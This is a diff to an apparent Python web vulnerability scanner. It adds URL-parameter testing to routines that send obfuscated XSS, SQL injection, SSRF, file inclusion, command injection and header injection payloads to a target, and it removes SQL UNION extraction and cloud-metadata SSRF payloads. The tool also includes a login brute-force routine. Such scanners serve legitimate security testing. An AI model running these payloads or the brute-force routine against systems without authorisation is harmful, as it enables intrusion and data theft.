@@ -15,7 +15,7 @@ import requests
 from bs4 import BeautifulSoup
 import os
 import matplotlib.pyplot as plt
-from urllib.parse import urlparse, urljoin, quote
+from urllib.parse import urlparse, urljoin, quote, urlencode
 import base64
 import html
 
@@ -128,193 +128,287 @@ def load_payloads_from_file(file_path):
 # XSS Testing for both stored and reflected XSS
 def xss_test(url, payloads):
     forms = crawl_for_forms(url)
-    
+
     def check_response(response, payload):
         if payload in response.text:
             return True
-        # Additional header check
         for header in response.headers.values():
             if payload in header:
                 return True
         return False
-    
+
+    # Test URL parameters for XSS
+    parsed_url = urlparse(url)
+    query_params = parsed_url.query.split('&')
+    param_names = [param.split('=')[0] for param in query_params if '=' in param]
+
+    for param in param_names:
+        for payload in payloads:
+            obfuscated_payloads = [payload] + obfuscate_payload(payload)
+            for obfuscated_payload in obfuscated_payloads:
+                new_query_params = {param: obfuscated_payload for param in param_names}
+                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
+                response = requests.get(new_url)
+
+                if check_response(response, payload):
+                    log_result("XSS Test", "Vulnerable", f"XSS vulnerability detected with payload {payload} in URL parameter {param}", url)
+                    return
+
+    # Test form parameters for XSS
     for form in forms:
         action = form['action']
         method = form['method']
         inputs = form['inputs']
-        
+
         for payload in payloads:
-            obfuscated_payloads = obfuscate_payload(payload)
+            obfuscated_payloads = [payload] + obfuscate_payload(payload)
             for obfuscated_payload in obfuscated_payloads:
                 data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                 if method == 'post':
                     response = requests.post(urljoin(url, action), data=data)
                 else:
                     response = requests.get(urljoin(url, action), params=data)
-                
+
                 if check_response(response, payload):
                     log_result("XSS Test", "Vulnerable", f"XSS vulnerability detected with payload {payload}", url, list(inputs.keys()))
                     return
-    log_result("XSS Test", "Not Vulnerable", f"No XSS vulnerability detected", url)
+    log_result("XSS Test", "Not Vulnerable", "No XSS vulnerability detected", url)
 
 # SQL Injection Testing for both parameters and headers
 def sql_injection_test(url, payloads):
     forms = crawl_for_forms(url)
-    modulating_payloads = [
-        "' UNION SELECT 1,2,3,4,5,6,concat(database(),system_user(),@@version)-- -",
-        "' UNION SELECT NULL, NULL, NULL, NULL, NULL, concat(database(), system_user(), @@version)-- -"
-    ]
-    headers = {
-        "User-Agent": "Mozilla/5.0",
-        "Referer": "http://example.com",
-        "X-Forwarded-For": "127.0.0.1"
-    }
-    
+
+    def check_response(response):
+        if "error" in response.text.lower() or "mysql" in response.text.lower():
+            return True
+        return False
+
+    # Test URL parameters for SQL Injection
+    parsed_url = urlparse(url)
+    query_params = parsed_url.query.split('&')
+    param_names = [param.split('=')[0] for param in query_params if '=' in param]
+
+    for param in param_names:
+        for payload in payloads:
+            obfuscated_payloads = [payload] + obfuscate_payload(payload)
+            for obfuscated_payload in obfuscated_payloads:
+                new_query_params = {param: obfuscated_payload for param in param_names}
+                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
+                response = requests.get(new_url)
+
+                if check_response(response):
+                    log_result("SQL Injection Test", "Vulnerable", f"SQL Injection vulnerability detected with payload {payload} in URL parameter {param}", url)
+                    return
+
+    # Test form parameters for SQL Injection
     for form in forms:
         action = form['action']
         method = form['method']
         inputs = form['inputs']
-        
+
         for payload in payloads:
-            obfuscated_payloads = obfuscate_payload(payload)
+            obfuscated_payloads = [payload] + obfuscate_payload(payload)
             for obfuscated_payload in obfuscated_payloads:
                 data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
-                
+
                 if method == 'post':
                     response = requests.post(urljoin(url, action), data=data)
                 else:
                     response = requests.get(urljoin(url, action), params=data)
-                
+
                 if "error" in response.text.lower() or "mysql" in response.text.lower():
                     log_result("SQL Injection Test", "Vulnerable", f"SQL Injection vulnerability detected with payload {payload}", url, list(inputs.keys()))
-                    # Test modulating payloads
-                    for mod_payload in modulating_payloads:
-                        mod_obfuscated_payloads = obfuscate_payload(mod_payload)
-                        for mod_obfuscated_payload in mod_obfuscated_payloads:
-                            data = {key: mod_obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
-                            if method == 'post':
-                                response = requests.post(urljoin(url, action), data=data)
-                            else:
-                                response = requests.get(urljoin(url, action), params=data)
-                            if "database" in response.text.lower() or "version" in response.text.lower():
-                                log_result("SQL Injection Test", "Vulnerable", f"Modulating SQL Injection payload executed: {mod_payload}", url, list(inputs.keys()))
-                                return
-    
-    log_result("SQL Injection Test", "Not Vulnerable", f"No SQL Injection vulnerability detected", url)
+                    return
+
+    log_result("SQL Injection Test", "Not Vulnerable", "No SQL Injection vulnerability detected", url)
 
 # SSRF Testing
 def ssrf_test(url, payloads):
     forms = crawl_for_forms(url)
-    modulating_payloads = [
-        "http://169.254.169.254/latest/meta-data/",
-        "http://localhost/admin"
-    ]
-    
+
+    def check_response(response):
+        if "error" in response.text.lower():
+            return True
+        return False
+
+    # Test URL parameters for SSRF
+    parsed_url = urlparse(url)
+    query_params = parsed_url.query.split('&')
+    param_names = [param.split('=')[0] for param in query_params if '=' in param]
+
+    for param in param_names:
+        for payload in payloads:
+            obfuscated_payloads = [payload] + obfuscate_payload(payload)
+            for obfuscated_payload in obfuscated_payloads:
+                new_query_params = {param: obfuscated_payload for param in param_names}
+                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
+                response = requests.get(new_url)
+
+                if check_response(response):
+                    log_result("SSRF Test", "Vulnerable", f"SSRF vulnerability detected with payload {payload} in URL parameter {param}", url)
+                    return
+
+    # Test form parameters for SSRF
     for form in forms:
         action = form['action']
         method = form['method']
         inputs = form['inputs']
-        
+
         for payload in payloads:
-            obfuscated_payloads = obfuscate_payload(payload)
+            obfuscated_payloads = [payload] + obfuscate_payload(payload)
             for obfuscated_payload in obfuscated_payloads:
                 data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                 if method == 'post':
                     response = requests.post(urljoin(url, action), data=data)
                 else:
                     response = requests.get(urljoin(url, action), params=data)
-                
+
                 if "error" in response.text.lower():
                     log_result("SSRF Test", "Vulnerable", f"SSRF vulnerability detected with payload {payload}", url, list(inputs.keys()))
-                    # Test modulating payloads
-                    for mod_payload in modulating_payloads:
-                        mod_obfuscated_payloads = obfuscate_payload(mod_payload)
-                        for mod_obfuscated_payload in obfuscated_payloads:
-                            data = {key: mod_obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
-                            if method == 'post':
-                                response = requests.post(urljoin(url, action), data=data)
-                            else:
-                                response = requests.get(urljoin(url, action), params=data)
-                            if any(keyword in response.text.lower() for keyword in ["meta-data", "admin"]):
-                                log_result("SSRF Test", "Vulnerable", f"Modulating SSRF payload executed: {mod_payload}", url, list(inputs.keys()))
-                                return
-    log_result("SSRF Test", "Not Vulnerable", f"No SSRF vulnerability detected", url)
+                    return
+    log_result("SSRF Test", "Not Vulnerable", "No SSRF vulnerability detected", url)
 
 # RFI Testing
 def rfi_test(url, payloads):
     forms = crawl_for_forms(url)
-    
+
+    def check_response(response):
+        if "error" in response.text.lower():
+            return True
+        return False
+
+    # Test URL parameters for RFI
+    parsed_url = urlparse(url)
+    query_params = parsed_url.query.split('&')
+    param_names = [param.split('=')[0] for param in query_params if '=' in param]
+
+    for param in param_names:
+        for payload in payloads:
+            obfuscated_payloads = [payload] + obfuscate_payload(payload)
+            for obfuscated_payload in obfuscated_payloads:
+                new_query_params = {param: obfuscated_payload for param in param_names}
+                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
+                response = requests.get(new_url)
+
+                if check_response(response):
+                    log_result("RFI Test", "Vulnerable", f"RFI vulnerability detected with payload {payload} in URL parameter {param}", url)
+                    return
+
+    # Test form parameters for RFI
     for form in forms:
         action = form['action']
         method = form['method']
         inputs = form['inputs']
-        
+
         for payload in payloads:
-            obfuscated_payloads = obfuscate_payload(payload)
+            obfuscated_payloads = [payload] + obfuscate_payload(payload)
             for obfuscated_payload in obfuscated_payloads:
                 data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                 if method == 'post':
                     response = requests.post(urljoin(url, action), data=data)
                 else:
                     response = requests.get(urljoin(url, action), params=data)
-                
+
                 if "error" in response.text.lower():
                     log_result("RFI Test", "Vulnerable", f"RFI vulnerability detected with payload {payload}", url, list(inputs.keys()))
                     return
-    log_result("RFI Test", "Not Vulnerable", f"No RFI vulnerability detected", url)
+    log_result("RFI Test", "Not Vulnerable", "No RFI vulnerability detected", url)
 
 # LFI Testing
 def lfi_test(url, payloads):
     forms = crawl_for_forms(url)
-    
+
+    def check_response(response):
+        indicators = ["root:x:0:0", "bin:x:1:1", "daemon:x:2:2"]
+        for indicator in indicators:
+            if indicator in response.text:
+                return True
+        return False
+
+    # Test URL parameters for LFI
+    parsed_url = urlparse(url)
+    query_params = parsed_url.query.split('&')
+    param_names = [param.split('=')[0] for param in query_params if '=' in param]
+
+    for param in param_names:
+        for payload in payloads:
+            obfuscated_payloads = [payload] + obfuscate_payload(payload)
+            for obfuscated_payload in obfuscated_payloads:
+                new_query_params = {param: obfuscated_payload for param in param_names}
+                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
+                response = requests.get(new_url)
+
+                if check_response(response):
+                    log_result("LFI Test", "Vulnerable", f"LFI vulnerability detected with payload {payload} in URL parameter {param}", url)
+                    return
+
+    # Test form parameters for LFI
     for form in forms:
         action = form['action']
         method = form['method']
         inputs = form['inputs']
-        
+
         for payload in payloads:
-            obfuscated_payloads = obfuscate_payload(payload)
+            obfuscated_payloads = [payload] + obfuscate_payload(payload)
             for obfuscated_payload in obfuscated_payloads:
                 data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                 if method == 'post':
                     response = requests.post(urljoin(url, action), data=data)
                 else:
                     response = requests.get(urljoin(url, action), params=data)
-                
-                if "root" in response.text:
+
+                if check_response(response):
                     log_result("LFI Test", "Vulnerable", f"LFI vulnerability detected with payload {payload}", url, list(inputs.keys()))
                     return
-    log_result("LFI Test", "Not Vulnerable", f"No LFI vulnerability detected", url)
+    log_result("LFI Test", "Not Vulnerable", "No LFI vulnerability detected", url)
 
 # Command Injection Testing
 def command_injection_test(url, payloads):
     forms = crawl_for_forms(url)
-    
+
     def check_response(response):
         keywords = ["uid=", "root", "Linux", "id", "whoami"]
         for keyword in keywords:
             if keyword in response.text:
                 return True
         return False
-    
+
+    # Test URL parameters for Command Injection
+    parsed_url = urlparse(url)
+    query_params = parsed_url.query.split('&')
+    param_names = [param.split('=')[0] for param in query_params if '=' in param]
+
+    for param in param_names:
+        for payload in payloads:
+            obfuscated_payloads = [payload] + obfuscate_payload(payload)
+            for obfuscated_payload in obfuscated_payloads:
+                new_query_params = {param: obfuscated_payload for param in param_names}
+                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
+                response = requests.get(new_url)
+
+                if check_response(response):
+                    log_result("Command Injection Test", "Vulnerable", f"Command injection detected with payload {payload} in URL parameter {param}", url)
+                    return
+
+    # Test form parameters for Command Injection
     for form in forms:
         action = form['action']
         method = form['method']
         inputs = form['inputs']
-        
+
         for payload in payloads:
-            obfuscated_payloads = obfuscate_payload(payload)
+            obfuscated_payloads = [payload] + obfuscate_payload(payload)
             for obfuscated_payload in obfuscated_payloads:
                 data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                 if method == 'post':
                     response = requests.post(urljoin(url, action), data=data)
                 else:
                     response = requests.get(urljoin(url, action), params=data)
-                
+
                 if check_response(response):
                     log_result("Command Injection Test", "Vulnerable", f"Command injection detected with payload {payload}", url, list(inputs.keys()))
                     return
-    log_result("Command Injection Test", "Not Vulnerable", f"No command injection detected", url)
+    log_result("Command Injection Test", "Not Vulnerable", "No command injection detected", url)
 
 # Header Injection Testing
 def header_injection_test(url, payloads):
@@ -323,7 +417,30 @@ def header_injection_test(url, payloads):
         "Referer": "http://example.com",
         "X-Forwarded-For": "127.0.0.1"
     }
-    
+
+    def check_response(response):
+        if "X-Test: injected-header" in response.text:
+            return True
+        return False
+
+    # Test URL parameters for Header Injection
+    parsed_url = urlparse(url)
+    query_params = parsed_url.query.split('&')
+    param_names = [param.split('=')[0] for param in query_params if '=' in param]
+
+    for param in param_names:
+        for payload in payloads:
+            obfuscated_payloads = [payload] + obfuscate_payload(payload)
+            for obfuscated_payload in obfuscated_payloads:
+                new_query_params = {param: obfuscated_payload for param in param_names}
+                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
+                response = requests.get(new_url)
+
+                if check_response(response):
+                    log_result("Header Injection Test", "Vulnerable", f"Header injection detected with payload {payload} in URL parameter {param}", url)
+                    return
+
+    # Test headers for Header Injection
     for field in headers:
         for payload in payloads:
             obfuscated_payloads = obfuscate_payload(payload)
@@ -331,10 +448,10 @@ def header_injection_test(url, payloads):
                 modified_headers = headers.copy()
                 modified_headers[field] += obfuscated_payload
                 response = requests.get(url, headers=modified_headers)
-                if "X-Test: injected-header" in response.text:
+                if check_response(response):
                     log_result("Header Injection Test", "Vulnerable", f"Header injection detected with payload {payload}", url, field)
                     return
-    log_result("Header Injection Test", "Not Vulnerable", f"No header injection detected", url)
+    log_result("Header Injection Test", "Not Vulnerable", "No header injection detected", url)
 
 # Brute Force Testing for Login Forms
 def brute_force_test(url, username, wordlist, payloads):
@@ -352,6 +469,7 @@ def brute_force_test(url, username, wordlist, payloads):
                     if "login successful" in response.text:
                         log_result("Brute Force Test", "Vulnerable", f"Found valid credentials: {username}/{password}", url, list(form['inputs'].keys()))
                         return
+    log_result("Brute Force Test", "Not Vulnerable", "No valid credentials found", url)
 
 # Session Handling for Login Automation
 def login(url, username, password):
@@ -415,7 +533,7 @@ def display_payload_menu():
 def handle_menu_choice(choice):
     target_url = input("Enter target URL: ")
     payloads = []
-    
+
     if choice in [2, 3, 4, 5, 6, 7, 8, 9]:
         display_payload_menu()
         payload_choice = int(input("Enter your choice: "))
@@ -435,7 +553,7 @@ def handle_menu_choice(choice):
                     "\";alert('XSS');//",
                     "';alert('XSS');",
                     "<iframe src=javascript:alert('XSS')>",
-                    "<math><mi><mo><mtext><mn><ms><mtext><mglyph><malignmark><maligngroup><ms><mtext>&lt;script&gt;alert('XSS')&lt;/script&gt;</mtext></ms></maligngroup></malignmark></mglyph></mn></mtext></mo></mi></math>",
+                  "<math><mi><mo><mtext><mn><ms><mtext><mglyph><malignmark><maligngroup><ms><mtext>&lt;script&gt;alert('XSS')&lt;/script&gt;</mtext></ms></maligngroup></malignmark></mglyph></mn></mtext></mo></mi></math>",
                     "<script>alert(String.fromCharCode(88,83,83))</script>",
                 ]
             elif choice == 3:
